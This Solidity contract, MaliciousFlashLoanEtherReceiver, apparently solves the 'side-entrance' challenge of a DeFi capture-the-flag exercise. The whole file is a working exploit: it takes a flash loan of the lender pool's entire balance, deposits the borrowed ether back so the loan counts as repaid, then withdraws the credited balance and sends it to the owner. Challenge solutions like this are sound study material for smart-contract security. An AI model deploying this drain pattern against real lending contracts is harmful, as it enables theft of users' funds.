// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;
import "../../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract MaliciousFlashLoanEtherReceiver is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable private pool;
    address immutable private owner;

    using Address for address payable;

    constructor(SideEntranceLenderPool _pool, address _owner) {
        pool = _pool;
        owner = _owner;
    }

    function flashLoan() external  {
        require(msg.sender == owner, 'Only the owner can flashLoan');
        pool.flashLoan(address(pool).balance);
    }

    function execute() override external payable {
        require(msg.value > 0, 'Value must be the pool balance');
        require(address(pool).balance == 0, 'Value must be the pool balance');
        pool.deposit{value: msg.value}();
    }

    function withdraw() external payable {
        require(msg.sender == owner, 'Only the owner can withdraw');
        pool.withdraw();
        require(address(pool).balance == 0, 'The pool balance must be 0');
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
